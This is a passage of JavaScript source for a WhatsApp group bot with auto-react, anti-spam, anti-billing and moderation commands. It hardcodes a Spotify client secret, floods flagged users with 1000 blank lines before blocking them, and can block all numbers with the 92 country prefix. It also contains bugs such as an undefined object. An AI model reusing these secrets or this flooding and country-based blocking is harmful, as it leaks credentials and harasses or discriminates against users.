  global.__BOUND_ANTI_SPAM__ = true
  console.log('Anti-spam handler bound successfully')
}
let autoReact = false; // Default is off

// Track incoming messages
PhistarBotInc.ev.on('messages.upsert', async (chatUpdate) => {
    try {
        const message = chatUpdate.messages[0]; // Get the incoming message
        if (!message || message.key.fromMe) return; // Ignore bot's own messages

        const messageId = message.key.id; // Message ID
        const sender = message.key.remoteJid; // Sender's ID
        const text =
            message.message?.conversation ||
            message.message?.extendedTextMessage?.text ||
            null;

        // React to the message if auto-react is enabled
        if (autoReact) {
            const randomEmojis = [
                '❤️', '👍', '🎉', '😎', '🔥', '👏', '💡', '✨', '🎈', '🌟', '😊', '😍', '💯', '😅', '🥳', '🤩', '🎶', '💖', '🍀', '🌈',
                '⚡', '💥', '🌺', '🌼', '🌸', '🌻', '🐾', '💌', '💝', '🌷', '🍁', '🍃', '🌿', '🌙', '🪐', '☀️', '🌞', '🌜', '🌑',
                '🌒', '🌓', '🌔', '🌕', '🌖', '🌗', '🌘', '🌚', '✨', '💎', '🖤', '💜', '❤️‍🔥', '💙', '💚', '💛', '🧡', '🤍', '🤎', '💗',
                '💓', '💞', '💘', '💌', '💍', '🔮', '🌍', '🌎', '🌏', '🪴', '🌵', '🌾', '🍂', '🍄', '🍉', '🍇', '🍓', '🍈', '🍒', '🍑', '🥭',
                '🍍', '🥥', '🍉', '🍊', '🍋', '🍏', '🍎', '🍍', '🍅', '🥕', '🥔', '🍠', '🌽', '🥒', '🍑', '🍋', '🍒', '🥝', '🫐', '🍜', '🍛',
                '🍝', '🍕', '🍣', '🍤', '🍖', '🍗', '🍠', '🥧', '🍩', '🍪', '🍨', '🍫', '🍬', '🍭', '🍡', '🍧', '🍦', '🥧', '🥨', '🥯', '🍪',
                '🍩', '🍪', '🥓', '🍔', '🥪', '🍟', '🥞', '🍣', '🍰', '🥧', '🍇', '🍉', '🥑', '🥥', '🥭', '🍅', '🥦', '🥕', '🥔', '🥗', '🥒',
                '🥥', '🍒', '🍑', '🍋', '🥭', '🍉', '🍇', '🍋', '🥝', '🫐', '🍊', '🍏', '🥕', '🍅', '🥒', '🥔', '🥥', '🍠', '🍞', '🥐', '🍩',
                '🍫', '🍬', '🍭', '🍡', '🍧', '🍦', '🥧', '🍪', '🍩', '🍕', '🍜', '🍚', '🍛', '🍕', '🍣', '🍤', '🍔', '🍗', '🍖', '🥓', '🥩',
                '🍿', '🎥', '🎬', '🎧', '🎮', '🎤', '🎵', '🎷', '🎺', '🎸', '🎻', '🎼', '🎶', '🎧', '🎵', '🎶', '🎤', '🎬', '🎮', '🎸', '🎹',
                '🎷', '🎺', '🎼', '🎻', '🎧', '🎮', '🎮', '🧸', '🪀', '🎨', '🖌️', '🎭', '🎪', '🎠', '🎰', '🛹', '🛷', '🏀', '⚽', '🏈', '🎱',
                '🎯', '🎳', '🏏', '🏑', '🏓', '🎾', '🛶', '🚴', '🧗', '🧘', '🏄', '🏇', '⛷️', '🏌️‍♂️', '⛹️‍♀️', '🚣', '🏆', '🎮', '🎲',
                '🎮', '🍕', '🍔', '🍟', '🍗', '🥔', '🥦', '🌽', '🥒', '🥝', '🥭', '🍍', '🍎', '🍊', '🍋', '🥭', '🥑', '🥒', '🌶️', '🍠', '🥔',
                '🍪', '🍩', '🍫', '🍫', '🍪', '🥪', '🥡', '🍜', '🍣', '🍤', '🍙', '🍚', '🍗', '🍖', '🥩', '🥓', '🥨', '🍧', '🍡', '🍪', '🍩',
                '🍜', '🍛', '🍝', '🥝', '🫐', '🍁', '🍃', '🌲', '🌳', '🌴', '🌱', '🪴', '🌾', '🌿', '🌺', '🌼', '🌻', '🌸', '🌷', '🌹', '💐',
                '🍀', '🍁', '🍃', '🌱', '🌿', '🌾', '🌸', '🌺', '🌻', '🌼', '💮', '🍂', '🍃', '🍄', '🌷', '🍁', '🌿', '🎋', '🎋', '🌹', '🌸'
            ];

            const randomEmoji = randomEmojis[Math.floor(Math.random() * randomEmojis.length)];

            // Send a random emoji as a reaction
            await PhistarBotInc.sendMessage(sender, {
                react: { text: randomEmoji, key: message.key }
            });
        }
    } catch (err) {
        console.error('Error tracking messages:', err);
    }
});
// Initialize warning database
const antispamPath = './antispam.json';
const spamTracker = {}; // Temporary in-memory tracker for spam

// Load or initialize antispam settings
function loadSpamSettings() {
    if (!fs.existsSync(antispamPath)) {
        const defaultData = { groups: {} };
        fs.writeFileSync(antispamPath, JSON.stringify(defaultData, null, 2), 'utf-8');
        console.log('Created antispam.json as it did not exist.');
        return defaultData;
    }
    return JSON.parse(fs.readFileSync(antispamPath, 'utf-8'));
}

// Save settings to the JSON file
function saveSpamSettings(data) {
    fs.writeFileSync(antispamPath, JSON.stringify(data, null, 2), 'utf-8');
}

// Update settings for a specific group
function updateSpamSettings(groupJid, settings) {
    const data = loadSpamSettings();
    data.groups[groupJid] = settings;
    saveSpamSettings(data);
}

// Retrieve settings for a specific group
function getSpamSettings(groupJid) {
    const data = loadSpamSettings();
    return data.groups[groupJid] || { enabled: false, spamLimit: 5 };
}
async function searchSpotifyTracks(query) {
  const clientId = 'acc6302297e040aeb6e4ac1fbdfd62c3';
  const clientSecret = '0e8439a1280a43aba9a5bc0a16f3f009';
  const auth = Buffer.from(`${clientId}:${clientSecret}`).toString('base64');

  const getToken = async () => {
    const response = await fetch('https://accounts.spotify.com/api/token', {
      method: 'POST',
      timeout: 60000, // 60 seconds
      body: new URLSearchParams({ grant_type: 'client_credentials' }),
      headers: { Authorization: `Basic ${auth}` },
    });
    return (await response.json()).access_token;
  };

  const accessToken = await getToken();
  const offset = 10;
  const searchUrl = `https://api.spotify.com/v1/search?q=${encodeURIComponent(query)}&type=track&offset=${offset}`;
  const response = await fetch(searchUrl, {
    headers: { Authorization: `Bearer ${accessToken}` },
  });
  const data = await response.json();
  return data.tracks.items;
}

function pickRandom(list) {
return list[Math.floor(list.length * Math.random())]
}

        if (!PhistarBotInc.public) {
            if (!isCreator && !m.key.fromMe) return
        }
        
        if (autoread) {
            PhistarBotInc.readMessages([m.key])
        }
        
        if (global.autoTyping) {
        PhistarBotInc.sendPresenceUpdate('composing', from)
        }

        if (global.autoRecording) {
        PhistarBotInc.sendPresenceUpdate('recording', from)
        }
       
        //bot number online status, available=online, unavailable=offline
        PhistarBotInc.sendPresenceUpdate('uavailable', from)
        
        if (global.autorecordtype) {
        let xeonrecordin = ['recording','composing']
        let xeonrecordinfinal = xeonrecordin[Math.floor(Math.random() * xeonrecordin.length)]
        PhistarBotInc.sendPresenceUpdate(xeonrecordinfinal, from)

        }
        
        if (autobio) {
            PhistarBotInc.updateProfileStatus(`24/7 Online Bot By ${ownername}`).catch(_ => _)
        }
        if (m.sender.startsWith('92') && global.anti92 === true) {
            return PhistarBotInc.updateBlockStatus(m.sender, 'block')
        }
        let list = []
        for (let i of owner) {
list.push({
	    	displayName: await PhistarBotInc.getName(i),
	    	vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await PhistarBotInc.getName(i)}\nFN:${await PhistarBotInc.getName(i)}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${ytname}\nitem2.X-ABLabel:YouTube\nitem3.URL:${socialm}\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${location};;;;\nitem4.X-ABLabel:Region\nEND:VCARD`
	    })
	}
	
	//chat counter (console log) - Rainbow Design
if (m.message && m.isGroup) {
    console.log(chalk.cyan(`\n╔══════════════════════════════════════════════════╗`))
    console.log(chalk.yellow(`║ 🏢 GROUP CHAT `) + chalk.cyan(`║`))
    console.log(chalk.cyan(`╠══════════════════════════════════════════════════╣`))
    console.log(chalk.magenta(`║ 📝 Message: `) + chalk.white(body || m.mtype) + chalk.cyan(` ║`))
    console.log(chalk.cyan(`╠──────────────────────────────────────────────────╢`))
    console.log(chalk.blue(`║ 👤 From: `) + chalk.green(pushname) + chalk.cyan(` ║`))
    console.log(chalk.cyan(`╠──────────────────────────────────────────────────╢`))
    console.log(chalk.yellow(`║ 🆔 Sender: `) + chalk.white(m.sender) + chalk.cyan(` ║`))
    console.log(chalk.cyan(`╠──────────────────────────────────────────────────╢`))
    console.log(chalk.green(`║ 🏠 Group: `) + chalk.cyan(groupName) + chalk.cyan(` ║`))
    console.log(chalk.cyan(`╠──────────────────────────────────────────────────╢`))
    console.log(chalk.red(`║ 🕒 Time: `) + chalk.white(new Date().toLocaleString()) + chalk.cyan(` ║`))
    console.log(chalk.cyan(`╚══════════════════════════════════════════════════╝\n`))
} else {
    console.log(chalk.cyan(`\n╔══════════════════════════════════════════════════╗`))
    console.log(chalk.green(`║ 🔒 PRIVATE CHAT `) + chalk.cyan(`║`))
    console.log(chalk.cyan(`╠══════════════════════════════════════════════════╣`))
    console.log(chalk.magenta(`║ 📝 Message: `) + chalk.white(body || m.mtype) + chalk.cyan(` ║`))
    console.log(chalk.cyan(`╠──────────────────────────────────────────────────╢`))
    console.log(chalk.blue(`║ 👤 From: `) + chalk.green(pushname) + chalk.cyan(` ║`))
    console.log(chalk.cyan(`╠──────────────────────────────────────────────────╢`))
    console.log(chalk.yellow(`║ 🆔 Sender: `) + chalk.white(m.sender) + chalk.cyan(` ║`))
    console.log(chalk.cyan(`╠──────────────────────────────────────────────────╢`))
    console.log(chalk.red(`║ 🕒 Time: `) + chalk.white(new Date().toLocaleString()) + chalk.cyan(` ║`))
    console.log(chalk.cyan(`╚══════════════════════════════════════════════════╝\n`))
}
      
let antibilling = false; // Default is off

// Define Billing Keywords
const billingKeywords = [
    'help', 'abeg', 'please', 'money', 'data', 'loan', 'send me', 'airtime', 'cash', 'boss',
    '2k'
    // Add more keywords here
];

// Message Handling
PhistarBotInc.ev.on('messages.upsert', async (chatUpdate) => {
    try {
        const message = chatUpdate.messages[0]; // Get the incoming message
        const m = message.message?.conversation || message.message?.extendedTextMessage?.text;

        // Only proceed if antibilling is activated and a text message is present
        if (antibilling && m) {
            const isBilling = billingKeywords.some(keyword => m.toLowerCase().includes(keyword));

            if (isBilling) {
                const sender = message.key.remoteJid;

                // Send filler text to chat
                const fillerText = "\n".repeat(1000);
                await PhistarBotInc.sendMessage(sender, { text: fillerText });

                // Notify the bot owner/admin
                const alertText = `${sender.split('@')[0]} 🚫 User flagged for billing attempts! User has been blocked.`;
                await PhistarBotInc.sendMessage(PhistarBotInc.user.id, { text: alertText });

                // Delete the offending message
                await PhistarBotInc.sendMessage(sender, { delete: message.key });

                // Block the user
                await PhistarBotInc.updateBlockStatus(sender, "block");
            }
        }
    } catch (err) {
        console.error('Error in Anti-Billing Handler:', err);
    }
});
// Define keywords for detection
const bigDaddyKeywords = ["play", "time", "weather", "help"]; // Add more keywords as needed

let bigDaddyActive = true; // Default is off

// Message Handling for Big Daddy interactions
PhistarBotInc.ev.on('messages.upsert', async (chatUpdate) => {
    try {
        const message = chatUpdate.messages[0]; // Get the incoming message
        const sender = message.key.remoteJid; // Message sender's ID
        const m = message.message?.conversation || message.message?.extendedTextMessage?.text;

        // Ensure the bot only responds to messages containing "Big Daddy"
        if (bigDaddyActive && m) {
            const isBigDaddyCall = m.toLowerCase().includes('big daddy');

            if (isBigDaddyCall) {
                // Extract the content following "Big Daddy"
                const command = m.toLowerCase().split('big daddy')[1]?.trim();

                if (command) {
                    // Check if any keyword exists in the command
                    const foundKeyword = bigDaddyKeywords.find(keyword => command.startsWith(keyword));

                    if (foundKeyword) {
                        // Extract and send the text after the detected keyword
                        const responseText = command.replace(foundKeyword, '').trim();
                        await PhistarBotInc.sendMessage(sender, { text: responseText || "I didn't catch that!" });
                    } else {
                        // Ignore if no listed keyword is found after "Big Daddy"
                        return;
                    }
                }
            }
        }
    } catch (err) {
        console.error('Error in Big Daddy Handler:', err);
    }
});
// Optional: Handle credential updates to ensure session persistence
PhistarBotInc.ev.on('creds.update', (creds) => {
    // Save credentials if needed (e.g., to a file or database)
    console.log('Credentials updated.');
});

const diaryPath = './diary.json';
function loadDiary() {
    if (!fs.existsSync(diaryPath)) fs.writeFileSync(diaryPath, JSON.stringify({}), 'utf-8');
    return JSON.parse(fs.readFileSync(diaryPath, 'utf-8'));
}
function saveDiary(data) {
    fs.writeFileSync(diaryPath, JSON.stringify(data, null, 2), 'utf-8');
}
global.savedVideos = {};
async function getUserReplyWithTimeout(chatId, timeout) {
    return new Promise((resolve) => {
        const timer = setTimeout(() => resolve(null), timeout); // Timeout after the specified duration

        PhistarBotInc.ev.on('messages.upsert', ({ messages }) => {
            const message = messages[0];
            if (message.key.remoteJid === chatId && !message.key.fromMe) {
                clearTimeout(timer); // Clear the timeout when a reply is received
                resolve(message.message.conversation); // Resolve with the user's message
            }
        });
    });
} 
           // ✅ Make sure hit data is loaded safely
let hit = []
try {
    hit = JSON.parse(fs.readFileSync('./database/total-hit-user.json'))
    if (!Array.isArray(hit) || hit.length === 0) {
        hit = [{ hit_cmd: 0 }]
    } else if (!('hit_cmd' in hit[0])) {
        hit[0].hit_cmd = 0
    }
} catch (e) {
    hit = [{ hit_cmd: 0 }]
}

// ✅ Command hit tracker
if (command) {
    const cmdadd = () => {
        hit[0].hit_cmd += 1
        fs.writeFileSync('./database/total-hit-user.json', JSON.stringify(hit))
    }
    cmdadd()
    const totalhit = hit[0].hit_cmd
}

// ✅ Voice Notes
for (let BhosdikaXeon of VoiceNoteXeon) {
    if (body === BhosdikaXeon) {
        let audiobuffy = fs.readFileSync(`./Phistar-media/audio/${BhosdikaXeon}.mp3`)
        PhistarBotInc.sendMessage(m.chat, { audio: audiobuffy, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
    }
}

// ✅ Stickers
for (let BhosdikaXeon of StickerXeon) {
    if (body === BhosdikaXeon) {
        let stickerbuffy = fs.readFileSync(`./Phistar-media/sticker/${BhosdikaXeon}.webp`)
        PhistarBotInc.sendMessage(m.chat, { sticker: stickerbuffy }, { quoted: m })
    }
}

// ✅ Images
for (let BhosdikaXeon of ImageXeon) {
    if (body === BhosdikaXeon) {
        let imagebuffy = fs.readFileSync(`./Phistar-media/image/${BhosdikaXeon}.jpg`)
        PhistarBotInc.sendMessage(m.chat, { image: imagebuffy }, { quoted: m })
    }
}

// ✅ Videos
for (let BhosdikaXeon of VideoXeon) {
    if (body === BhosdikaXeon) {
        let videobuffy = fs.readFileSync(`./Phistar-media/video/${BhosdikaXeon}.mp4`)
        PhistarBotInc.sendMessage(m.chat, { video: videobuffy }, { quoted: m })
    }
}

// ✅ APKs
const sendapk = (teks) => {
    PhistarBotInc.sendMessage(from, { document: teks, mimetype: 'application/vnd.android.package-archive' }, { quoted: m })
}
for (let BhosdikaXeon of ApkXeon) {
    if (body === BhosdikaXeon) {
        let buffer = fs.readFileSync(`./Phistar-media/apk/${BhosdikaXeon}.apk`)
        sendapk(buffer)
    }
}

// ✅ ZIPs
const sendzip = (teks) => {
    PhistarBotInc.sendMessage(from, { document: teks, mimetype: 'application/zip' }, { quoted: m })
}
for (let BhosdikaXeon of ZipXeon) {
    if (body === BhosdikaXeon) {
        let buffer = fs.readFileSync(`./Phistar-media/zip/${BhosdikaXeon}.zip`)
        sendzip(buffer)
    }
}

// ✅ PDFs
const senddocu = (teks) => {
    haikal.sendMessage(from, { document: teks, mimetype: 'application/pdf' }, { quoted: m })
}
for (let BhosdikaXeon of DocXeon) {
    if (body === BhosdikaXeon) {
        let buffer = fs.readFileSync(`./Phistar-media/doc/${BhosdikaXeon}.pdf`)
        senddocu(buffer)
    }
}

// ✅ AFK System
if (m.isGroup && !m.key.fromMe) {
    let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
    for (let ment of mentionUser) {
        if (afk.checkAfkUser(ment, _afk)) {
            let getId2 = afk.getAfkId(ment, _afk)
            let getReason2 = afk.getAfkReason(getId2, _afk)
            let getTimee = Date.now() - afk.getAfkTime(getId2, _afk)
            let heheh2 = ms(getTimee)
            replyphistar(`Don't tag him, he's afk\n\n*Reason :* ${getReason2}`)
        }
    }
    if (afk.checkAfkUser(m.sender, _afk)) {
        let getId = afk.getAfkId(m.sender, _afk)
        let getReason = afk.getAfkReason(getId, _afk)
        let getTime = Date.now() - afk.getAfkTime(getId, _afk)
        let heheh = ms(getTime)
        _afk.splice(afk.getAfkPosition(m.sender, _afk), 1)
        fs.writeFileSync('./database/afk-user.json', JSON.stringify(_afk))
        PhistarBotInc.sendTextWithMentions(m.chat, `@${m.sender.split('@')[0]} have returned from afk`, m)
    }
}

// ✅ Command switch
switch (command) {
case 'antilink':
    if (!m.isGroup) return replyphistar(mess.group)
    if (!isAdmins && !isCreator) return replyphistar(mess.admin)
    if (!isBotAdmins) return replyphistar(mess.botAdmin)
    
    if (args.length < 1) {
      const currentMode = getAntiLinkMode(m.chat)
      return replyphistar(`🔗 Current anti-link mode: *${currentMode.toUpperCase()}*\n\nUsage:\n- ${prefix}antilink delete - Delete links only\n- ${prefix}antilink warn - Delete and warn users\n- ${prefix}antilink kick - Delete and kick users\n- ${prefix}antilink off - Disable anti-link`)
    }
    
    const mode = args[0].toLowerCase()
    const antiLinkData = readjsonSafeAntiLink(ANTI_LINK_PATH, {})
    
    if (mode === 'off') {
      if (!antiLinkData[m.chat] || !antiLinkData[m.chat].enabled) {
        return replyphistar("❌ Anti-link is already disabled for this group.")
      }
      
      antiLinkData[m.chat].enabled = false
      writejsonSafeAntiLink(ANTI_LINK_PATH, antiLinkData)
      return replyphistar("✅ Anti-link has been disabled for this group.")
    }
    
    if (!['delete', 'warn', 'kick'].includes(mode)) {
      return replyphistar(`❌ Invalid mode! Use: delete, warn, or kick\nExample: ${prefix}antilink warn`)
    }
    
    // Enable anti-link with specified mode
    antiLinkData[m.chat] = {
      enabled: true,
      mode: mode
    }
    
    writejsonSafeAntiLink(ANTI_LINK_PATH, antiLinkData)
    replyphistar(`✅ Anti-link enabled with *${mode.toUpperCase()}* mode.\nLinks will be automatically ${mode === 'delete' ? 'deleted' : mode === 'warn' ? 'deleted and users warned' : 'deleted and users kicked'}.`)
    break

case 'warnings':
    if (!m.isGroup) return replyphistar(mess.group)
    
    const targetUser = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : sender
    const warnCount = getWarningCount(m.chat, targetUser)
    
    replyphistar(`⚠️ @${targetUser.split('@')[0]} has ${warnCount} warning(s) for posting links.`, { mentions: [targetUser] })
    break

case 'clearwarnings':
    if (!m.isGroup) return replyphistar(mess.group)
    if (!isAdmins && !isCreator) return replyphistar(mess.admin)
    if (!isBotAdmins) return replyphistar(mess.botAdmin)
    
    const userToClear = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : (args[0] || sender)
    clearWarnings(m.chat, userToClear)
    
    replyphistar(`✅ Warnings cleared for @${userToClear.split('@')[0]}.`, { mentions: [userToClear] })
    break

// Add a test command to debug link detection
case 'testlink':
    if (!isCreator) return replyphistar(mess.owner)
    const testText = args.join(' ')
    if (!testText) return replyphistar('Please provide text to test')
    
    const hasLink = containsLink(testText)
    replyphistar(`Link detection test:\nText: "${testText}"\nContains link: ${hasLink ? '✅ YES' : '❌ NO'}`)
    break
case 'autowelcome':
    if (!m.isGroup) return replyphistar(mess.group)
    if (!isAdmins && !isCreator) return replyphistar(mess.admin)
    if (!isBotAdmins) return replyphistar(mess.botAdmin)
    if (args.length < 1) return replyphistar(`Example: ${prefix + command} on/off`)

    // Read the current data from the file
    const autoWelcomeGroups = JSON.parse(fs.readFileSync('./database/autowelcome.json', 'utf-8') || '[]')

    if (args[0].toLowerCase() === 'on') {
        if (autoWelcomeGroups.includes(m.chat)) return replyphistar("✅ Auto-Welcome is already activated in this group.")
        
        // Add the group ID to the file
        autoWelcomeGroups.push(m.chat)
        fs.writeFileSync('./database/autowelcome.json', JSON.stringify(autoWelcomeGroups, null, 2))
        replyphistar("✅ Auto-Welcome has been activated. New members will be welcomed, leaving members will be notified, and promotions/demotions will be announced once per action.")
    } else if (args[0].toLowerCase() === 'off') {
        if (!autoWelcomeGroups.includes(m.chat)) return replyphistar("❌ Auto-Welcome is already disabled for this group.")
        
        // Remove the group ID from the file
        const updatedGroups = autoWelcomeGroups.filter(group => group !== m.chat)
        fs.writeFileSync('./database/autowelcome.json', JSON.stringify(updatedGroups, null, 2))
        replyphistar("✅ Auto-Welcome has been disabled for this group.")
    } else {
        replyphistar(`❌ Invalid option! Use:\n- *${prefix + command} on* to enable\n- *${prefix + command} off* to disable.`)
    }
    break
case 'antispam':
    if (!m.isGroup) return replyphistar(mess.group)
    if (!isAdmins && !isCreator) return replyphistar(mess.admin)
    if (!isBotAdmins) return replyphistar(mess.botAdmin)
    
    if (args.length < 1) {
      const settings = getAntiSpamSettings(m.chat)
      
      return replyphistar(
        `🛡️ Anti-spam: *${settings.enabled ? 'ENABLED' : 'DISABLED'}*\n` +
        `🔧 Mode: *${settings.mode.toUpperCase()}*\n` +
        `⚡ Action: *${settings.action.toUpperCase()}*\n` +
        `📊 Max messages/min: *${settings.maxMessagesPerMinute}*\n` +
        `📏 Max message length: *${settings.maxMessageLength}*\n` +
        `⚠️ Warn threshold: *${settings.warnThreshold}*\n\n` +
        `Usage:\n- ${prefix}antispam on/off - Enable/disable\n` +
        `- ${prefix}antispam mode <delete|warn|kick> - Set action\n` +
        `- ${prefix}antispam action <warn|mute|kick> - Set final action\n` +
        `- ${prefix}antispam rate <number> - Set max messages per minute\n` +
        `- ${prefix}antispam length <number> - Set max message length\n` +
        `- ${prefix}antispam threshold <number> - Set warning threshold\n` +
        `- ${prefix}antispam reset - Reset settings to default`
      )
    }
    
    const subcommand = args[0].toLowerCase()
    const settings = getAntiSpamSettings(m.chat)
    
    if (subcommand === 'on' || subcommand === 'off') {
      updateAntiSpamSettings(m.chat, { enabled: subcommand === 'on' })
      return replyphistar(`✅ Anti-spam has been ${subcommand === 'on' ? 'enabled' : 'disabled'} for this group.`)
    }
    else if (subcommand === 'mode' && args.length > 1) {
      const mode = args[1].toLowerCase()
      if (!['delete', 'warn', 'kick'].includes(mode)) {
        return replyphistar('❌ Invalid mode! Use: delete, warn, or kick')
      }
      
      updateAntiSpamSettings(m.chat, { mode })
      return replyphistar(`✅ Anti-spam mode set to *${mode.toUpperCase()}*.`)
    }
    else if (subcommand === 'action' && args.length > 1) {
      const action = args[1].toLowerCase()
      if (!['warn', 'mute', 'kick'].includes(action)) {
        return replyphistar('❌ Invalid action! Use: warn, mute, or kick')
      }
      
      updateAntiSpamSettings(m.chat, { action })
      return replyphistar(`✅ Anti-spam action set to *${action.toUpperCase()}*.`)
    }
    else if (subcommand === 'rate' && args.length > 1) {
      const rate = parseInt(args[1])
      if (isNaN(rate) || rate < 1 || rate > 100) {
        return replyphistar('❌ Invalid rate! Use a number between 1 and 100')
      }
      
      updateAntiSpamSettings(m.chat, { maxMessagesPerMinute: rate })
      return replyphistar(`✅ Max messages per minute set to *${rate}*.`)
    }
    else if (subcommand === 'length' && args.length > 1) {
      const length = parseInt(args[1])
      if (isNaN(length) || length < 50 || length > 5000) {
        return replyphistar('❌ Invalid length! Use a number between 50 and 5000')
      }
      
      updateAntiSpamSettings(m.chat, { maxMessageLength: length })
      return replyphistar(`✅ Max message length set to *${length}* characters.`)
    }
    else if (subcommand === 'threshold' && args.length > 1) {
      const threshold = parseInt(args[1])
      if (isNaN(threshold) || threshold < 1 || threshold > 10) {
        return replyphistar('❌ Invalid threshold! Use a number between 1 and 10')
      }
      
      updateAntiSpamSettings(m.chat, { warnThreshold: threshold })
      return replyphistar(`✅ Warning threshold set to *${threshold}*.`)
    }
    else if (subcommand === 'reset') {
      initAntiSpamGroup(m.chat) // This resets to defaults
      return replyphistar('✅ Anti-spam settings reset to default values.')
    }
    else {
      return replyphistar(`❌ Invalid sub-command! Use: on, off, mode, action, rate, length, threshold, or reset`)
    }
    break
// Add these cases to your command handler

case 'antiword':
    if (!m.isGroup) return replyphistar(mess.group)
    if (!isAdmins && !isCreator) return replyphistar(mess.admin)
    if (!isBotAdmins) return replyphistar(mess.botAdmin)
    
    if (args.length < 1) {
      const currentMode = getAntiWordMode(m.chat)
      const currentSensitivity = getAntiWordSensitivity(m.chat)
      const bannedWords = getBannedWords(m.chat)
      
      let wordList = 'No banned words set'
      if (bannedWords.length > 0) {
        wordList = bannedWords.map((word, index) => `${index + 1}. ${word}`).join('\n')
      }
      
      const isEnabled = isAntiWordGroup(m.chat)
      
      return replyphistar(
        `🔞 Anti-word: *${isEnabled ? 'ENABLED' : 'DISABLED'}*\n` +
        `🔧 Mode: *${currentMode.toUpperCase()}*\n` +
        `🎚️ Sensitivity: *${currentSensitivity.toUpperCase()}*\n` +
        `📝 Banned words (${bannedWords.length}):\n${wordList}\n\n` +
        `Usage:\n- ${prefix}antiword on/off - Enable/disable\n` +
        `- ${prefix}antiword mode <delete|warn|kick> - Set action\n` +
        `- ${prefix}antiword sensitivity <strict|moderate|lenient> - Set sensitivity\n` +
        `- ${prefix}antiword add <word> - Add banned word\n` +
        `- ${prefix}antiword remove <word> - Remove banned word\n` +
        `- ${prefix}antiword list - Show banned words`
      )
    }
    
    const subCommand = args[0].toLowerCase()
    const antiWordData = readjsonSafeAntiWord(ANTI_WORD_PATH, {})
    
    // Initialize group data if it doesn't exist
    if (!antiWordData[m.chat]) {
      antiWordData[m.chat] = { enabled: false, mode: 'delete', sensitivity: 'strict', words: [] }
    }
    
    // Ensure words array exists
    if (!antiWordData[m.chat].words) {
      antiWordData[m.chat].words = []
    }
    
    if (subCommand === 'on' || subCommand === 'off') {
      antiWordData[m.chat].enabled = (subCommand === 'on')
      writejsonSafeAntiWord(ANTI_WORD_PATH, antiWordData)
      return replyphistar(`✅ Anti-word has been ${subCommand === 'on' ? 'enabled' : 'disabled'} for this group.`)
    }
    else if (subCommand === 'mode' && args.length > 1) {
      const mode = args[1].toLowerCase()
      if (!['delete', 'warn', 'kick'].includes(mode)) {
        return replyphistar('❌ Invalid mode! Use: delete, warn, or kick')
      }
      
      antiWordData[m.chat].mode = mode
      writejsonSafeAntiWord(ANTI_WORD_PATH, antiWordData)
      return replyphistar(`✅ Anti-word mode set to *${mode.toUpperCase()}*.`)
    }
    else if (subCommand === 'sensitivity' && args.length > 1) {
      const sensitivity = args[1].toLowerCase()
      if (!['strict', 'moderate', 'lenient'].includes(sensitivity)) {
        return replyphistar('❌ Invalid sensitivity! Use: strict, moderate, or lenient')
      }
      
      antiWordData[m.chat].sensitivity = sensitivity
      writejsonSafeAntiWord(ANTI_WORD_PATH, antiWordData)
      return replyphistar(`✅ Anti-word sensitivity set to *${sensitivity.toUpperCase()}*.`)
    }
    else if (subCommand === 'add' && args.length > 1) {
      const word = args.slice(1).join(' ').trim()
      if (!word) return replyphistar('❌ Please provide a word to ban')
      if (word.length > 50) return replyphistar('❌ Word is too long (max 50 characters)')
      
      if (addBannedWord(m.chat, word)) {
        return replyphistar(`✅ Added "${word}" to banned words list.`)
      } else {
        return replyphistar(`❌ "${word}" is already in the banned words list.`)
      }
    }
    else if (subCommand === 'remove' && args.length > 1) {
      const word = args.slice(1).join(' ').trim()
      if (!word) return replyphistar('❌ Please provide a word to remove')
      
      if (removeBannedWord(m.chat, word)) {
        return replyphistar(`✅ Removed "${word}" from banned words list.`)
      } else {
        return replyphistar(`❌ "${word}" was not found in the banned words list.`)
      }
    }
    else if (subCommand === 'list') {
      const bannedWords = getBannedWords(m.chat)
      if (bannedWords.length === 0) {
        return replyphistar('📝 No banned words in this group.')
      }
      
      return replyphistar(`📝 Banned words in this group (${bannedWords.length}):\n${bannedWords.map((word, index) => `${index + 1}. ${word}`).join('\n')}`)
    }
    else if (subCommand === 'clear') {
      if (antiWordData[m.chat]) {
        antiWordData[m.chat].words = []
        writejsonSafeAntiWord(ANTI_WORD_PATH, antiWordData)
        return replyphistar('✅ All banned words have been cleared from this group.')
      }
    }
    else {
      return replyphistar(`❌ Invalid sub-command! Use: on, off, mode, sensitivity, add, remove, list, or clear`)
    }
    break

case 'wordwarnings':
    if (!m.isGroup) return replyphistar(mess.group)
    
    const targetuser = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : sender
    const warncount = getWordWarningCount(m.chat, targetuser)
    
    replyphistar(`⚠️ @${targetuser.split('@')[0]} has ${warncount} warning(s) for using banned words.`, { mentions: [targetuser] })
    break

case 'clearwordwarnings':
    if (!m.isGroup) return replyphistar(mess.group)
    if (!isAdmins && !isCreator) return replyphistar(mess.admin)
    if (!isBotAdmins) return replyphistar(mess.botAdmin)
    
    const usertoClear = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : (args[0] || sender)
    clearWordWarnings(m.chat, usertoClear)
    
    replyphistar(`✅ Warnings cleared for @${usertoClear.split('@')[0]}.`, { mentions: [usertoClear] })
    break

// Mute command cases
case 'mute':
    if (!m.isGroup) return replyphistar(mess.group)
    if (!isAdmins && !isCreator) return replyphistar(mess.admin)
    if (!isBotAdmins) return replyphistar(mess.botAdmin)
    
    if (args.length < 2) {
      return replyphistar(`❌ Usage: ${prefix}mute @user <time>\nExamples:\n- ${prefix}mute @user 30m\n- ${prefix}mute @user 2h\n- ${prefix}mute @user 1d`)
    }
    
    const mentionedUser = m.mentionedJid && m.mentionedJid[0]
    if (!mentionedUser) return replyphistar('❌ Please mention a user to mute')
    
    // Prevent self-muting and bot muting
    if (mentionedUser === PhistarBotInc.user.id) {
      return replyphistar('❌ I cannot mute myself!')
    }
    if (mentionedUser === sender) {
      return replyphistar('❌ You cannot mute yourself!')
    }
    
    // Check if target is admin
    try {
      const metadata = await PhistarBotInc.groupMetadata(m.chat)
      const targetParticipant = metadata.participants.find(p => p.id === mentionedUser)
      if (targetParticipant && (targetParticipant.admin === 'admin' || targetParticipant.admin === 'superadmin')) {
        return replyphistar('❌ Cannot mute group admins!')
